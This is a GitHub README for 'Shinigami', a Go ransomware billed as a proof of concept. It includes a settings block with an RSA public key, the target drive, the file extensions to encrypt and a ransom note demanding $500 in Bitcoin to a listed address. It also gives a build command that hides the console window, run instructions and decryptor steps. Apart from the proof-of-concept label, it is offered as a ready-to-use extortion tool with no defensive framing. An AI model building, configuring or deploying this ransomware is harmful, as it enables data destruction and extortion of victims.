# Shinigami
Shinigami PoC ransomware
![ICON](https://github.com/user-attachments/assets/00d9b120-88c0-4ee6-b1e9-97dd404dab7b)
<br>
Shinigami is a PoC ransomware written in go<br><br>
tested on windows 11
## possibilities:
<ul>
<li>using hybrid encryption (witch is fast and safe)</li>
<li>customize settings</li>
<li>good appearance</li>
<li>changing background picture</li>
</ul>

## requirements:
<ul>
<li>gcc (added to Path)</li>
<li>golang (you can download from here: https://golang.org/dl/)</li>
<li>fyne (golang library: http://www.fyne.io/fyne)</li>
</ul>

## to use:

### clone the repository

```
https://github.com/bala-ganesh-m/Shinigami-Ransomware/
```

### change settings

go to Shinigami/shinigami/main.go and change the settings:

```golang
	/*** SETTINGS ***/
	//server rsa public key ( if you want to change this you should first generate a rsa keypair next replace it in both ransomware and decryptor programs )
	serverpubkey := "-----BEGIN PUBLIC KEY-----\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA3eWrYNmEzwLXGT0HUqqu\nkrimoiBKZE9mIzWvN51YLONneY0B8/yiLgJxg5pUOp8AEnu3gQm9uPQzbdyZniQq\n58HzSS+2Py17/UWlwqZVueUQ/RBvhH/BaEDZlKK7SUzeUqWbC0klDeLQ1nY48DEJ\nD2wNkz3CWXgDqQ0tfOqy+hRrR6ispOZc7k2SDd6cX8jkKzacH7sxBDYDVT2E/nYP\nkOBcCUW2ywN/y0FE1uqxim+axwtFW652k5ARHalmOVIXM6Oky6r4x49MN8zkIZEC\nhGDIOxQGYUEtp+0NhmAMyl26DtI23NMjyTaB7+DYtEZzSYgBllmfla1RtoEgKaHI\ns30PIUvZQGmg6VcEEhfy0hbtjDjWANkBrNewK46mH9pwH2wsYmm9QSftUjF62PbM\nLrFxoJS1w6NeYTC+s5JqGnG3sftCzGXMI+VSRvoVAWU+mm/ntQj5yww4nRq4Ylre\nJZAsLRUfT87c5uomolGitlGPIyXjxhxgPzc5egvQ199BAgMBAAE=\n-----END PUBLIC KEY-----"
	//root directory ( only files in this directory and subfolders of this directory will be encrypted )
	rootdir := "E:\\"
	//valid file extensions to encrypt ( only files with these extensions will be encrypted )
	validfileextensions := []string{"lnk", "pdf", "doc", "docx", "docm", "xlsx", "xlsm", "jpg", "jpeg", "png", "mp3", "mp4", "mkv", "py", "cs", "c", "c#", "cpp", "pptx", "pkt"}
	//valid file size to encrypt ( only files that have the same or less weight than this will be encrypted )
	//here is 400MB --> 1024 * 1024 * 400 = 419430400
	validfilesize := 419430400
	//the massage you want to show to the victim
	message := "YOUR FILES HAVE BEEN ENCRYPTED \n\nAll of your important files have been locked with our encryption \nYou will not recover them without our decryption tool. \n\nDo not attempt to decrypt the files yourself \nDo not shut down or restart your PC.\n\n"
	message += "To restore access: \nSend $500 in Bitcoin to the address below. \nBitcoin Address: bc1qtnqwcwffkvh6dmu9twfg3x5svwew0lp077k86"
```

### create binary file

just go to Shinigami/shinigami directory and run: <br>

```
go build -ldflags -H=windowsgui -o Shinigami.exe main.go
```

-ldflags -H=windowsgui options will hide the console window

### run the file

just click on shinigami.exe file<br>
after some seconds desktop ppicture will change and a window like this will appear<br>

![Screenshot 2025-04-08 185317](https://github.com/user-attachments/assets/67b60deb-9839-4245-a107-0762a4630694)
<br>


and you can see that some of your files are encrypted<br>

![Screenshot 2025-04-08 185429](https://github.com/user-attachments/assets/33efb55d-bd47-4040-b976-85b4edbac8f5)
<br>

### decrypting files

to decrypt files click on Get victimkey button. you will see a notepad window. <br>

![Screenshot 2025-04-08 185507](https://github.com/user-attachments/assets/42cc79d6-e1f4-4500-a2a4-f50a410c77fe)
<br>

copy this text and go to Shinigami/shinigamidecryptor and run:<br>

```
go run decryptor.go <victim key here>
```

decryptor will give you a 32 character text like this:<br>
```
k8T2fDFkKbdBwdlnbVgxJTucm0oNBdwa
```
now enter this text in Password textbox and click on Check password button. psycho will start to decrypt your files (it can take a while)<br>
![Screenshot 2025-04-08 190112](https://github.com/user-attachments/assets/28fddb9a-e268-4f77-b4bf-7012f59dd8d3)
<br>

Now you got your files back<br>

Have fun!
